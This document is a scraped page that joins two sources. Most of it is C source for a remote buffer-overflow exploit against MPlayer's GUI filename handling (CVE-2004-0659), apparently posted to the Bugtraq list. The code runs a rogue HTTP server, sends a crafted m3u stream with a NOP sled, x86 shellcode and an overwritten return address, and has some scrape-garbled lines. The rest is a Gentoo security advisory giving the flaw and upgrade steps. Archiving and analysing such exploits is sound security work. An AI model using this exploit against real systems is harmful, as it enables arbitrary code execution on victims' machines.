#define EIPWRT		4			/* Byte count for overwrite */
#define NOP		0x90			/* NoOp padding */
#define OFFSET		0			/* Offset from retaddr */
#define PORT		80			/* Listener port */
#define RETADDR 	0xbfffcb9c		/* Remote return address */
#define THREAT		"MPlayer/1.0pre4-3.2.2" /* Latest vulnerable version */

#define example(OhNoo)	fprintf(stderr, "Usage: ./memplayer -a <align_val> -o \
<offset_val>\n\n", OhNoo); #define looking(OhYes)  fprintf(stderr, "I'm looking for \
projects to work on, mail me if you have something\n\n", OhYes);

unsigned int i;
char payload[BUFFER];

void banner(void);
void die(char *ohnn);

int pkg_prep(int clisock_fd, int align, int offset);
int pkg_send(int clisock_fd, char *payload);
int main(int argc, char **argv);

char *http[] = {
        "HTTP/1.0 200 OK\r\n",
	"Date: Thu, 01 Jun 2004 12:52:15 GMT\r\n",
	"Server: MemPlayer/1.0.3 (Linux)\r\n",
	"MIME-version: 1.0\r\n",
	"Content-Type: audio/x-mpegurl\r\n",
	"Content-Length: 666\r\n",
	"Connection: close\r\n",
	"\r\n"
};

char *m3umuxor[] = {
        "\x23\x45\x58\x54\x4D\x33\x55\r\n",
        "\x23\x45\x58\x54\x49\x4E\x46\x3A"
        "\x2E\x2c\x4F\x70\x65\x6E\x2D\x53"
        "\x65\x63\x75\x72\x69\x74\x79\x2E"
        "\x52\x6F\x63\x6B\x73\r\n",
        "\r\n"
};

char opcode[] = {
	0x31,0xc0,0x89,0xc3,0xb0,0x17,0xcd,0x80,0x31,0xc0,0x89,0xc3,
	0xb0,0x24,0xcd,0x80,0x31,0xc0,0x89,0xc3,0xb0,0x24,0xcd,0x80,
	0x31,0xc0,0x89,0xc3,0x89,0xc1,0x89,0xc2,0xb0,0x58,0xbb,0xad,
	0xde,0xe1,0xfe,0xb9,0x69,0x19,0x12,0x28,0xba,0x67,0x45,0x23,
	0x01,0xcd,0x80,0x31,0xc0,0x89,0xc3,0xfe,0xc0,0xcd,0x80
};

void
banner(void)
{
	fprintf(stderr, "\n  ** MPlayer_Memplayer.c - Remote exploit demo POC **\n\n");
	fprintf(stderr, "[-] Uses m3u header reference to make MPlayer think it has a\n");
	fprintf(stderr, "[-] valid media file then crafted package is sent, overflows\n");
	fprintf(stderr, "[-] the guiIntfStruct.Filename buffer && proves exploit POC.\n");
	fprintf(stderr, "[-] c0ntex@open-security.org {} <http://www.open-security.org>  \
\n\n"); }

void
die(char *err_trap)
{
	perror(err_trap);
	fflush(stderr); _exit(1);
}

int
pkg_prep(int clisock_fd, int align, int offset)
{
	unsigned int recv_chk;
	long retaddr;

	char chk_vuln[[69]](#69);
	char *pload = (char *) &opcode;

	retaddr = RETADDR - offset;

	fprintf(stderr, " -> Using align [%d] and offset [%d]\n", align, offset);

	memset(chk_vuln, 0, sizeof(chk_vuln));

	recv_chk = recv(clisock_fd, chk_vuln, sizeof(chk_vuln) -1, 0);
	chk_vuln[recv_chk+1] = '\0';

	if(recv_chk == -1 || recv_chk == 0) {
		fprintf(stderr, "Could not receive data from client\n");
	}

	if(strstr(chk_vuln, THREAT) || strstr(chk_vuln, "MPlayer/0")) {
		fprintf(stderr, " -> Detected vulnerable MPlayer version\n");
	}else{
		fprintf(stderr, " -> Detected a non-MPlayer connection, end.\n");
		close(clisock_fd);
		_exit(1);
	}

	fprintf(stderr, " -> Payload size to send is [%d]\n", sizeof(payload));
	fprintf(stderr, " -> Sending evil payload to our client\n");

	memset(payload, 0, BUFFER);

	for(i = (BUFFER - EIPWRT); i < BUFFER; i += 4)
               *(long *)&payload[i] = retaddr;

	for (i = 0; i < (BUFFER - sizeof(opcode) - 4); ++i)
                *(payload + i) = NOP;

        memcpy(payload + i, pload, strlen(pload));

        payload[545] = 0x00;

	return SUCCESS;
}

int
pkg_send(int clisock_fd, char *payload)
{

	for (i = 0; i < 8; i++)
		if(send(clisock_fd, http[i], strlen(http[i]), 0) == -1) {
			die("Could not send HTTP header");
		}fprintf(stderr, "\t- Sending valid HTTP header..\n"); sleep(1);

	for (i = 0; i < 3; i++)
		if(send(clisock_fd, m3umuxor[i], strlen(m3umuxor[i]), 0) == -1) {
			die("Could not send m3u header");
       		}fprintf(stderr, "\t- Sending valid m3u header..\n"); sleep(1);

	if(send(clisock_fd, payload, strlen(payload), 0) == -1) {
		die("Could not send payload");
	}fprintf(stderr, "\t- Sending payload package..\n");

	return SUCCESS;
}

int
main(int argc, char **argv)
{
	unsigned int align = 0, offset = 0, reuse = 1;
	unsigned int port = PORT;
	unsigned int cl_buf, opts;

	signed int clisock_fd, sock_fd;

	static char *exploit, *work;

	struct sockaddr_in victim;
	struct sockaddr_in confess;

	if(argc < 2) {
		banner();
		example(exploit);
		_exit(1);
	}banner();

	while((opts = getopt(argc, argv, "a:o:")) != -1) {
		switch(opts)
			{
			case 'a':
				align = atoi(optarg);
				break;
			case 'o':
				offset = atoi(optarg);
				break;
			default:
				align = ALIGN;
				offset = OFFSET;
			}
	}

	if((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		die("Could not create socket");
	}

	if(setsockopt(sock_fd,SOL_SOCKET,SO_REUSEADDR, &reuse, sizeof(int)) == -1) {
		die("Could not re-use socket");
	}

	memset(&confess, 0, sizeof(confess));

	confess.sin_family = AF_INET;
	confess.sin_port = htons(port);
	confess.sin_addr.s_addr = htonl(INADDR_ANY);

	if(bind(sock_fd, (struct sockaddr *)&confess, sizeof(struct sockaddr)) == -1) {
	die("Could not bind socket");
	}

	if(listen(sock_fd, 0) == -1) {
		die("Could not listen on socket");
	}

	printf(" -> Listening for a connection on port %d\n", port);

	cl_buf = sizeof(victim);
	clisock_fd = accept(sock_fd, (struct sockaddr *)&victim, &cl_buf);

	fprintf(stderr, " -> Action: Attaching from host[%s]\n", \
inet_ntoa(victim.sin_addr));

	if(pkg_prep(clisock_fd, align, offset) == 1) {
		fprintf(stderr, "Could not prep package\n");
		_exit(1);
	}

	if(pkg_send(clisock_fd, payload) == 1) {
		fprintf(stderr, "Could not send package\n");
		_exit(1);
	}
	sleep(2);

	fprintf(stderr, " -> Test complete\n\n");

	close(clisock_fd); looking(work);

	return SUCCESS;
}

[[prev in list](?l=bugtraq&m=108843896506099&w=2)] [[next in list](?l=bugtraq&m=108844000409449&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from www.gentoo.org_83600c87_20250125_073430.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# MPlayer: GUI filename handling overflow — GLSA **200408-01**

When compiled with GUI support MPlayer is vulnerable to a remotely
exploitable buffer overflow attack.

### Affected packages

| Package | **media-video/mplayer** on all architectures |
| --- | --- |
| Affected versions | < **1.0\_pre4-r7** |
| Unaffected versions | >= **1.0\_pre4-r7** |

### Background

MPlayer is a media player capable of handling multiple multimedia file
formats.

### Description

The MPlayer GUI code contains several buffer overflow vulnerabilities,
and at least one in the TranslateFilename() function is exploitable.

### Impact

By enticing a user to play a file with a carefully crafted filename an
attacker could execute arbitrary code with the permissions of the user
running MPlayer.

### Workaround

To work around this issue, users can compile MPlayer without GUI
support by disabling the gtk USE flag. All users are encouraged to
upgrade to the latest available version of MPlayer.

### Resolution

All MPlayer users should upgrade to the latest version:

```
 # emerge sync

 # emerge -pv ">=media-video/mplayer-1.0_pre4-r7"
 # emerge ">=media-video/mplayer-1.0_pre4-r7"
```
### References

* [Bugtraq Announcement](http://www.securityfocus.com/bid/10615/)
* [Open-Security Announcement](http://www.open-security.org/advisories/5)
* [CVE-2004-0659](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0659)

**Release date**

August 01, 2004

**Latest revision**

May 22, 2006: 02

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [55456](https://bugs.gentoo.org/show_bug.cgi?id=55456)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**


